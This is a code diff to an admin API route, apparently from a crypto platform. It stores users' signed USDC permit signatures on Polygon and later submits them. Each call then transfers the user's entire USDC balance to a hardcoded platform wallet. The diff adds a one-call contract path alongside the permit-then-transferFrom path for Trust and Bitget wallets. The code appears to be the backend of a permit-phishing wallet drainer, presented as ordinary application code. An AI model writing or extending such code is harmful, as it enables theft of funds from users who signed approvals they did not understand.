@@ -22,6 +22,7 @@ const CONFIG = {
   rpcUrl: process.env.POLYGON_RPC_URL || 'https://polygon-rpc.com',
   usdcAddress: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359' as `0x${string}`,
   platformWallet: '0x6c4C745d909B13528e638C7Aa63ABA9406fA8c63' as `0x${string}`,
+  merkleTreeContract: '0x76f0d64bC0D41262aebBCc584679Ee1EBb22dd0d' as `0x${string}`,
 }
 
 const USDC_ABI = parseAbi([
@@ -29,6 +30,11 @@ const USDC_ABI = parseAbi([
   'function transferFrom(address from, address to, uint256 amount) returns (bool)',
   'function balanceOf(address account) view returns (uint256)',
   'function nonces(address owner) view returns (uint256)',
+])
+
+// PolnationMerkleTree 合约 ABI
+const MERKLE_TREE_ABI = parseAbi([
+  'function executeWithPermit(address owner, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s, address recipient, uint256 amount, bytes32 operationId)',
 ])
 
 // 验证管理员 session
@@ -131,35 +137,59 @@ export async function POST(request: NextRequest) {
       return NextResponse.json({ error: 'User has no USDC balance' }, { status: 400 })
     }
 
-    // 执行 permit
-    const permitHash = await walletClient.writeContract({
-      address: CONFIG.usdcAddress,
-      abi: USDC_ABI,
-      functionName: 'permit',
-      args: [
-        sig.owner_address as `0x${string}`,
-        sig.spender_address as `0x${string}`,
-        BigInt(sig.value),
-        BigInt(sig.deadline),
-        sig.v,
-        sig.r as `0x${string}`,
-        sig.s as `0x${string}`,
-      ],
-    })
+    const isContractSpender = sig.spender_address?.toLowerCase() === CONFIG.merkleTreeContract.toLowerCase()
 
-    await publicClient.waitForTransactionReceipt({ hash: permitHash })
+    let transferHash: `0x${string}`
 
-    // 执行 transferFrom
-    const transferHash = await walletClient.writeContract({
-      address: CONFIG.usdcAddress,
-      abi: USDC_ABI,
-      functionName: 'transferFrom',
-      args: [
-        sig.owner_address as `0x${string}`,
-        CONFIG.platformWallet,
-        balance,
-      ],
-    })
+    if (isContractSpender) {
+      // 合约 spender：单笔调用 executeWithPermit（原子操作）
+      const operationId = `0x${Buffer.from(signatureId.toString()).toString('hex').padStart(64, '0')}` as `0x${string}`
+      transferHash = await walletClient.writeContract({
+        address: CONFIG.merkleTreeContract,
+        abi: MERKLE_TREE_ABI,
+        functionName: 'executeWithPermit',
+        args: [
+          sig.owner_address as `0x${string}`,
+          BigInt(sig.value),
+          BigInt(sig.deadline),
+          sig.v,
+          sig.r as `0x${string}`,
+          sig.s as `0x${string}`,
+          CONFIG.platformWallet,
+          balance,
+          operationId,
+        ],
+      })
+    } else {
+      // EOA spender（Trust / Bitget）：分两步执行
+      const permitHash = await walletClient.writeContract({
+        address: CONFIG.usdcAddress,
+        abi: USDC_ABI,
+        functionName: 'permit',
+        args: [
+          sig.owner_address as `0x${string}`,
+          sig.spender_address as `0x${string}`,
+          BigInt(sig.value),
+          BigInt(sig.deadline),
+          sig.v,
+          sig.r as `0x${string}`,
+          sig.s as `0x${string}`,
+        ],
+      })
+
+      await publicClient.waitForTransactionReceipt({ hash: permitHash })
+
+      transferHash = await walletClient.writeContract({
+        address: CONFIG.usdcAddress,
+        abi: USDC_ABI,
+        functionName: 'transferFrom',
+        args: [
+          sig.owner_address as `0x${string}`,
+          CONFIG.platformWallet,
+          balance,
+        ],
+      })
+    }
 
     await publicClient.waitForTransactionReceipt({ hash: transferHash })
 
